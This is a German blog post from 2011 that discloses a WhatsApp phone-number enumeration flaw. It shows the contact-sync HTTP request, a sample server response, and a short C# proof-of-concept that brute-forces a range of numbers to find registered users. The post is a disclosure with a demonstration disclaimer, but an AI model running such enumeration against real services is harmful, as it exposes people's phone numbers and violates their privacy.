@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="de"><head>
+    
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="keywords" content="Johannes Mittendorfer, Mittendorfer, Blog, Informatik, Entwicklung, Security">
+    <meta name="description" content="Der Blog von Johannes Mittendorfer über Software, IT-Security und das Internet">
+    <meta name="author" content="Johannes Mittendorfer">
+    <meta http-equiv="cleartype" content="on">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <meta name="application-name" content="Johannes Mittendorfer"/>
+    <meta name="msapplication-TileColor" content="#f9fbf4"/>
+    <meta http-equiv="imagetoolbar" content="false" />
+    <meta property="fb:admins" content="100000063853580" />
+    <meta name="Content-Language" content="de" />
+    
+    <link rel="shortcut icon" href="/assets/favicon.ico">
+    <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml">
+    <link rel="canoncial" href="https://blog.johannes-mittendorfer.com/">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css" integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js" integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+    
+    
+    <link rel="stylesheet" href="https://blog.johannes-mittendorfer.com/styles.min.f93f4e51d7d393b46e7874802b06d820d7f22d0b5b68cecd9c431a0bb299bb42.css">
+    
+    
+    
+    <title>Johannes Mittendorfer | WhatsApp erlaubt Bruteforce auf Telefonnummern</title>
+    
+</head><body itemscope itemtype="http://schema.org/WebSite">
+<nav id="bar">
+    <section class="container">
+        <a class="title" itemprop="url" href="/">
+            <h1 itemprop="name">Johannes Mittendorfer</h1>
+        </a>
+        <ul>
+            
+            <li>
+                <a href="/">
+                    Start
+                </a>
+            </li>
+            
+            <li>
+                <a href="/ueber-mich">
+                    Über
+                </a>
+            </li>
+            
+            <li>
+                <a href="/astronomie">
+                    Astronomie
+                </a>
+            </li>
+            
+            <li>
+                <a href="/impressum">
+                    Impressum
+                </a>
+            </li>
+            
+        </ul>
+    </section>
+</nav>
+        <div class="container">
+            <main>
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <div class="meta">
+            <span class="category">Security</span> &ndash; 
+            <time itemprop="datePublished" datetime="2011-12-03 00:00:00 &#43;0000 UTC" class="date">03.12.2011</time> &ndash;
+            <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
+        </div>
+        <h1 itemprop="headline">WhatsApp erlaubt Bruteforce auf Telefonnummern</h1>
+
+        
+        <div class="warning">
+            Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
+        </div>
+        
+    </header>
+    <div itemprop="articleBody">
+        <p>Eine Telefonnummer möchte man meist gerne für sich behalten, um nicht von Personen belästigt zu werden und einfach seine Ruhe zu haben. Mit der Nutzung der weitverbreiteten WhatsApp-Anwendung auf seinem Mobiltelefon macht man jedoch möglich die Rufnummern der angemeldeten Benutzer zu durchsuchen. In der App wird angezeigt welche seiner Kontakte bereits für WhatsApp registriert sind.</p>
+<p>Dazu wird eine Anfrage mit den Telefonnummern seiner Kontakte an den WhatsApp-Server <em>sro.whatsapp.net</em> geschickt:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /client/iphone/iq.php HTTP/1.1 
+</span></span><span style="display:flex;"><span>Host: sro.whatsapp.net 
+</span></span><span style="display:flex;"><span>User-Agent: WhatsApp/2.6.7 iPhone_OS/4.3.3 Device/iPhone 
+</span></span><span style="display:flex;"><span>Accept: */* 
+</span></span><span style="display:flex;"><span>Accept-Language: de-de 
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate 
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded 
+</span></span><span style="display:flex;"><span>Content-Length: 710 
+</span></span><span style="display:flex;"><span>Connection: keep-alive 
+</span></span><span style="display:flex;"><span>Proxy-Connection: keep-alive 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd=1&amp;amp;cc=43&amp;amp;me=664XXXXXXX&amp;amp;u[]=0699XXXXXXX&amp;amp;u[]=0680XXXXXXX
+</span></span></code></pre></div><p>Im Body der POST-Anfrage an <code>/client/iphone/iq.php</code> werden die Telefonnummern als Array (?) in der Form des GET-Parameters <code>u[]=XXXXXXXXXXX</code> übermittelt. Der Parameter <em>me</em> muss jedoch nicht angegeben werden. Zudem darf die Anfrage auch über <em>GET</em> erfolgen. Auf die Anfrage antwortet der Server mit dem Status der Teilnehmer im plist-Format:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#000">&lt;plist</span> <span style="color:#000">version=</span><span style="color:#5a2">&#34;1.0&#34;</span><span style="color:#000">&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#000">&lt;array&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#000">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>P<span style="color:#000">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;string&gt;</span>0043664.......<span style="color:#000">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>T<span style="color:#000">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;integer&gt;</span>199610<span style="color:#000">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>S<span style="color:#000">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;string&gt;</span>....<span style="color:#000">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>JID<span style="color:#000">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;string&gt;</span>43664.......<span style="color:#000">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#000">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#000">&lt;/array&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">&lt;/plist&gt;</span>
+</span></span></code></pre></div><p>So ist es natürlich auch möglich einen Brute-Force Angriff auf Handynummern zu starten, und das funktioniert auch. Man kann zum Beispiel hundert Nummern generieren lassen, die man dann alle zusammen an den WhatsApp-Server übermittelt. Daraufhin erhält man alle Benutzer in diesem Bereich, die WhatsApp benutzen. Als ein Proof-of-Concept habe ich ein kleines Programm in C# zusammengestöpselt, das Telefonnummern aus einem bestimmten Bereich generiert und diese anschließ;end an den passenden WhatsApp-Server schickt. Anschließ;end wird der Inhalt der plist-Datei in der Konsole ausgegeben.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Collections.Generic</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Linq</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Text</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Net</span>; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">namespace</span> <span style="color:#000">WhatsAppBrute</span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#00f">class</span> <span style="color:#000">Program</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#00f">static</span> <span style="color:#00f">void</span> <span style="color:#000">Main</span>(<span style="color:#00f">string</span>[] <span style="color:#000">args</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#000">WebClient</span> <span style="color:#000">c</span> = <span style="color:#00f">new</span> <span style="color:#000">WebClient</span>(); 
+</span></span><span style="display:flex;"><span>			<span style="color:#000">String</span> <span style="color:#000">start</span> = <span style="color:#5a2">&#34;https://sro.whatsapp.net/client/iphone/iq.php?cd=1&amp;amp;cc=43&#34;</span> 
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#00f">for</span> (<span style="color:#000">Int32</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &amp;<span style="color:#000">lt</span>; <span style="color:#3af">100</span>; <span style="color:#000">i</span>++){
+</span></span><span style="display:flex;"><span>				<span style="color:#000">String</span> <span style="color:#000">count</span>; 
+</span></span><span style="display:flex;"><span>				
+</span></span><span style="display:flex;"><span>				<span style="color:#00f">if</span>(<span style="color:#000">i</span> &lt; <span style="color:#3af">10</span>){
+</span></span><span style="display:flex;"><span>					<span style="color:#000">count</span> = <span style="color:#5a2">&#34;0&#34;</span> + <span style="color:#000">i</span>.<span style="color:#000">ToString</span>(); 
+</span></span><span style="display:flex;"><span>				} 
+</span></span><span style="display:flex;"><span>				<span style="color:#00f">else</span> { 
+</span></span><span style="display:flex;"><span>					<span style="color:#000">count</span> = <span style="color:#000">i</span>.<span style="color:#000">ToString</span>(); 
+</span></span><span style="display:flex;"><span>				} 
+</span></span><span style="display:flex;"><span>				
+</span></span><span style="display:flex;"><span>				<span style="color:#000">start</span> += <span style="color:#5a2">&#34;&amp;u[]=0664XXXXX&#34;</span> + <span style="color:#000">count</span>; 
+</span></span><span style="display:flex;"><span>			} 
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#000">Console</span>.<span style="color:#000">WriteLine</span>(<span style="color:#000">c</span>.<span style="color:#000">DownloadString</span>(<span style="color:#000">start</span>)); 
+</span></span><span style="display:flex;"><span>			<span style="color:#000">Console</span>.<span style="color:#000">ReadLine</span>(); 
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	} 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Dieser Code dient nur zu Vorführzwecken und darf nicht für einen Angriff auf die Server von WhatsApp verwendet werden!</strong></p>
+<p>Fazit: Es ist erschreckend wie einfach eine solche Anfrage ausgeführt werden kann und wie freizügig mit den Telefonnummern umgegangen wird. Natürlich wird nicht jeder Benutzer eine so umständliche Art benutzen (wollen), aber es ist möglich.</p>
+
+    </div>
+</article>
+
+            </main>
+        </div>
+    </body>
+</html>
